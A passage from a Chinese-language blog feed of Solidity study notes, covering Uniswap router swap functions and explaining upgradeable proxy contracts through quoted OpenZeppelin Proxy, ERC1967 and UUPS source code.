Token</p></li><li><p>swapTokensForExactETH：用未指定数量的Token换取指定数量的ETH</p></li><li><p>swapExactTokensForETH：用指定数量的Token兑换回未指定数量的ETH</p></li><li><p>swapETHForExactTokens：用未指定数量的ETH兑换指定数量的Token</p></li><li><p>swapExactTokensForTokensSupportingFeeOnTransferTokens：指定数量的Token兑换Token，支持转账时扣费</p></li><li><p>swapExactETHForTokensSupportingFeeOnTransferTokens：：指定数量的ETH兑换Token，支持转账时扣费</p></li><li><p>swapExactTokensForETHSupportingFeeOnTransferTokens：指定数量的Token兑换 ETH，支持转账时扣费</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> -知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Proxy代理合约的理解</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/Proxy%E4%BB%A3%E7%90%86%E5%90%88%E7%BA%A6%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/Proxy%E4%BB%A3%E7%90%86%E5%90%88%E7%BA%A6%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="代理的原理"><a href="#代理的原理" class="headerlink" title="代理的原理"></a>代理的原理</h1><p>调用者(call)       &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&gt;     proxy代理合约            &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&gt;     逻辑合约 Implementation</p><p>将数据与逻辑分开，可以不断的更新逻辑，从而达到升级的目的，关键是delegatecall的调用，两者的储存结构应该一样，否则就造成重大危机。</p><p>代理合约可以分为三大模块   ：代理合约Proxy  逻辑合约Logic  调用示例 Caller </p><h2 id="模块一Proxy"><a href="#模块一Proxy" class="headerlink" title="模块一Proxy"></a>模块一Proxy</h2><p>主要是用来储存数据，用Implementation用来进行delegatecall调用</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v4.6.0) (proxy/Proxy.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.19;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM</span><br><span class="line"> * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to</span><br><span class="line"> * be specified by overriding the virtual &#123;_implementation&#125; function.</span><br><span class="line"> *</span><br><span class="line"> * Additionally, delegation to the implementation can be triggered manually through the &#123;_fallback&#125; function, or to a</span><br><span class="line"> * different contract through the &#123;_delegate&#125; function.</span><br><span class="line"> *</span><br><span class="line"> * The success and return data of the delegated call will be returned back to the caller of the proxy.</span><br><span class="line"> */</span><br><span class="line">abstract contract Proxy &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Delegates the current call to `implementation`.</span><br><span class="line">     *</span><br><span class="line">     * This function does not return to its internal call site, it will return directly to the external caller.</span><br><span class="line">     */</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // Copy msg.data. We take full control of memory in this inline assembly</span><br><span class="line">            // block because it will not return to Solidity code. We overwrite the</span><br><span class="line">            // Solidity scratch pad at memory position 0.</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line"></span><br><span class="line">            // Call the implementation.</span><br><span class="line">            // out and outsize are 0 because we don&#x27;t know the size yet.</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line"></span><br><span class="line">            // Copy the returned data.</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line"></span><br><span class="line">            switch result</span><br><span class="line">            // delegatecall returns 0 on error.</span><br><span class="line">            case 0 &#123;</span><br><span class="line">                revert(0, returndatasize())</span><br><span class="line">            &#125;</span><br><span class="line">            default &#123;</span><br><span class="line">                return(0, returndatasize())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function</span><br><span class="line">     * and &#123;_fallback&#125; should delegate.</span><br><span class="line">     */</span><br><span class="line">    function _implementation() internal view virtual returns (address);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Delegates the current call to the address returned by `_implementation()`.</span><br><span class="line">     *</span><br><span class="line">     * This function does not return to its internal call site, it will return directly to the external caller.</span><br><span class="line">     */</span><br><span class="line">    function _fallback() internal virtual &#123;</span><br><span class="line">        _beforeFallback();</span><br><span class="line">        _delegate(_implementation());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other</span><br><span class="line">     * function in the contract matches the call data.</span><br><span class="line">     */</span><br><span class="line">    fallback() external payable virtual &#123;</span><br><span class="line">        _fallback();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data</span><br><span class="line">     * is empty.</span><br><span class="line">     */</span><br><span class="line">    receive() external payable virtual &#123;</span><br><span class="line">        _fallback();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`</span><br><span class="line">     * call, or as part of the Solidity `fallback` or `receive` functions.</span><br><span class="line">     *</span><br><span class="line">     * If overridden should call `super._beforeFallback()`.</span><br><span class="line">     */</span><br><span class="line">    function _beforeFallback() internal virtual &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><p>在fallback里面调用了重写的_delegate，运用了内联汇编，使得可以接收返回的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        // Copy msg.data. We take full control of memory in this inline assembly</span><br><span class="line">        // block because it will not return to Solidity code. We overwrite the</span><br><span class="line">        // Solidity scratch pad at memory position 0.</span><br><span class="line">        calldatacopy(0, 0, calldatasize())</span><br><span class="line"></span><br><span class="line">        // Call the implementation.</span><br><span class="line">        // out and outsize are 0 because we don&#x27;t know the size yet.</span><br><span class="line">        let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line"></span><br><span class="line">        // Copy the returned data.</span><br><span class="line">        returndatacopy(0, 0, returndatasize())</span><br><span class="line"></span><br><span class="line">        switch result</span><br><span class="line">        // delegatecall returns 0 on error.</span><br><span class="line">        case 0 &#123;</span><br><span class="line">            revert(0, returndatasize())</span><br><span class="line">        &#125;</span><br><span class="line">        default &#123;</span><br><span class="line">            return(0, returndatasize())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="模块二Logic"><a href="#模块二Logic" class="headerlink" title="模块二Logic"></a>模块二Logic</h2><p>用来实现逻辑，并不在本合约中进行调用，而是通过Proxy delegatecall此合约。</p><h2 id="模块三Caller"><a href="#模块三Caller" class="headerlink" title="模块三Caller"></a>模块三Caller</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Caller&#123;  </span><br><span class="line">    address public proxy; // 代理合约 </span><br><span class="line">    constructor(address proxy_)&#123;</span><br><span class="line">        proxy = proxy_;</span><br><span class="line">    &#125;</span><br><span class="line">    function Logicfunction() external returns(uint) &#123; </span><br><span class="line">        (,bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;Logicfunction()&quot;));</span><br><span class="line">        return abi.decode(data,(uint));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过caller合约call Proxy中的逻辑合约中的函数，从而实现调用，完成调用。</p><h1 id="ERC1967"><a href="#ERC1967" class="headerlink" title="ERC1967"></a>ERC1967</h1><p>ERC1967Proxy–&gt;Proxy, ERC1967Upgrade</p><h2 id="ERC1967Proxy-sol"><a href="#ERC1967Proxy-sol" class="headerlink" title="ERC1967Proxy.sol"></a>ERC1967Proxy.sol</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v4.7.0) (proxy/ERC1967/ERC1967Proxy.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.19;</span><br><span class="line"></span><br><span class="line">import &quot;../Proxy.sol&quot;;</span><br><span class="line">import &quot;./ERC1967Upgrade.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an</span><br><span class="line"> * implementation address that can be changed. This address is stored in storage in the location specified by</span><br><span class="line"> * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn&#x27;t conflict with the storage layout of the</span><br><span class="line"> * implementation behind the proxy.</span><br><span class="line"> */</span><br><span class="line">contract ERC1967Proxy is Proxy, ERC1967Upgrade &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">     *</span><br><span class="line">     * If `_data` is nonempty, it&#x27;s used as data in a delegate call to `_logic`. This will typically be an encoded</span><br><span class="line">     * function call, and allows initializing the storage of the proxy like a Solidity constructor.</span><br><span class="line">     */</span><br><span class="line">    constructor(address _logic, bytes memory _data) payable &#123;</span><br><span class="line">        _upgradeToAndCall(_logic, _data, false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the current implementation address.</span><br><span class="line">     *</span><br><span class="line">     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the</span><br><span class="line">     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.</span><br><span class="line">     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`</span><br><span class="line">     */</span><br><span class="line">    function _implementation() internal view virtual override returns (address impl) &#123;</span><br><span class="line">        return _getImplementation();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC1967Upgrade-sol"><a href="#ERC1967Upgrade-sol" class="headerlink" title="ERC1967Upgrade.sol"></a>ERC1967Upgrade.sol</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v4.9.0) (proxy/ERC1967/ERC1967Upgrade.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.19;</span><br><span class="line"></span><br><span class="line">import &quot;../beacon/IBeacon.sol&quot;;</span><br><span class="line">import &quot;../../interfaces/IERC1967.sol&quot;;</span><br><span class="line">import &quot;../../interfaces/draft-IERC1822.sol&quot;;</span><br><span class="line">import &quot;../../utils/Address.sol&quot;;</span><br><span class="line">import &quot;../../utils/StorageSlot.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev This abstract contract provides getters and event emitting update functions for</span><br><span class="line"> * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.</span><br><span class="line"> *</span><br><span class="line"> * _Available since v4.1._</span><br><span class="line"> */</span><br><span class="line">abstract contract ERC1967Upgrade is IERC1967 &#123;</span><br><span class="line">    // This is the keccak-256 hash of &quot;eip1967.proxy.rollback&quot; subtracted by 1</span><br><span class="line">    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Storage slot with the address of the current implementation.</span><br><span class="line">     * This is the keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1, and is</span><br><span class="line">     * validated in the constructor.</span><br><span class="line">     */</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the current implementation address.</span><br><span class="line">     */</span><br><span class="line">    function _getImplementation() internal view returns (address) &#123;</span><br><span class="line">        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">     */</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(newImplementation.code.length &gt; 0, &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Perform implementation upgrade</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Upgraded&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function _upgradeTo(address newImplementation) internal &#123;</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        emit Upgraded(newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Perform implementation upgrade with additional setup call.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Upgraded&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function _upgradeToAndCall(address newImplementation, bytes memory data, bool forceCall) internal &#123;</span><br><span class="line">        _upgradeTo(newImplementation);</span><br><span class="line">        if (data.length &gt; 0 || forceCall) &#123;</span><br><span class="line">            Address.functionDelegateCall(newImplementation, data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Upgraded&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function _upgradeToAndCallUUPS(address newImplementation, bytes memory data, bool forceCall) internal &#123;</span><br><span class="line">        // Upgrades from old implementations will perform a rollback test. This test requires the new</span><br><span class="line">        // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing</span><br><span class="line">        // this special case will break upgrade paths from old UUPS implementation to new ones.</span><br><span class="line">        if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) &#123;</span><br><span class="line">            _setImplementation(newImplementation);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) &#123;</span><br><span class="line">                require(slot == _IMPLEMENTATION_SLOT, &quot;ERC1967Upgrade: unsupported proxiableUUID&quot;);</span><br><span class="line">            &#125; catch &#123;</span><br><span class="line">                revert(&quot;ERC1967Upgrade: new implementation is not UUPS&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            _upgradeToAndCall(newImplementation, data, forceCall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Storage slot with the admin of the contract.</span><br><span class="line">     * This is the keccak-256 hash of &quot;eip1967.proxy.admin&quot; subtracted by 1, and is</span><br><span class="line">     * validated in the constructor.</span><br><span class="line">     */</span><br><span class="line">    bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the current admin.</span><br><span class="line">     *</span><br><span class="line">     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the</span><br><span class="line">     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.</span><br><span class="line">     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`</span><br><span class="line">     */</span><br><span class="line">    function _getAdmin() internal view returns (address) &#123;</span><br><span class="line">        return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Stores a new address in the EIP1967 admin slot.</span><br><span class="line">     */</span><br><span class="line">    function _setAdmin(address newAdmin) private &#123;</span><br><span class="line">        require(newAdmin != address(0), &quot;ERC1967: new admin is the zero address&quot;);</span><br><span class="line">        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Changes the admin of the proxy.</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;AdminChanged&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function _changeAdmin(address newAdmin) internal &#123;</span><br><span class="line">        emit AdminChanged(_getAdmin(), newAdmin);</span><br><span class="line">        _setAdmin(newAdmin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.</span><br><span class="line">     * This is bytes32(uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1)) and is validated in the constructor.</span><br><span class="line">     */</span><br><span class="line">    bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the current beacon.</span><br><span class="line">     */</span><br><span class="line">    function _getBeacon() internal view returns (address) &#123;</span><br><span class="line">        return StorageSlot.getAddressSlot(_BEACON_SLOT).value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Stores a new beacon in the EIP1967 beacon slot.</span><br><span class="line">     */</span><br><span class="line">    function _setBeacon(address newBeacon) private &#123;</span><br><span class="line">        require(newBeacon.code.length &gt; 0, &quot;ERC1967: new beacon is not a contract&quot;);</span><br><span class="line">        require(</span><br><span class="line">            IBeacon(newBeacon).implementation().code.length &gt; 0,</span><br><span class="line">            &quot;ERC1967: beacon implementation is not a contract&quot;</span><br><span class="line">        );</span><br><span class="line">        StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does</span><br><span class="line">     * not upgrade the implementation contained in the beacon (see &#123;UpgradeableBeacon-_setImplementation&#125; for that).</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;BeaconUpgraded&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function _upgradeBeaconToAndCall(address newBeacon, bytes memory data, bool forceCall) internal &#123;</span><br><span class="line">        _setBeacon(newBeacon);</span><br><span class="line">        emit BeaconUpgraded(newBeacon);</span><br><span class="line">        if (data.length &gt; 0 || forceCall) &#123;</span><br><span class="line">            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="UUPS类型代理"><a href="#UUPS类型代理" class="headerlink" title="UUPS类型代理"></a>UUPS类型代理</h1><h2 id="UUPSUpgradeable-Code"><a href="#UUPSUpgradeable-Code" class="headerlink" title="UUPSUpgradeable Code"></a>UUPSUpgradeable Code</h2><h3 id="UUPSUpgradeable-sol"><a href="#UUPSUpgradeable-sol" class="headerlink" title="UUPSUpgradeable.sol"></a>UUPSUpgradeable.sol</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v4.9.0) (proxy/utils/UUPSUpgradeable.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.19;</span><br><span class="line"></span><br><span class="line">import &quot;../../interfaces/draft-IERC1822.sol&quot;;</span><br><span class="line">import &quot;../ERC1967/ERC1967Upgrade.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev An upgradeability mechanism designed for 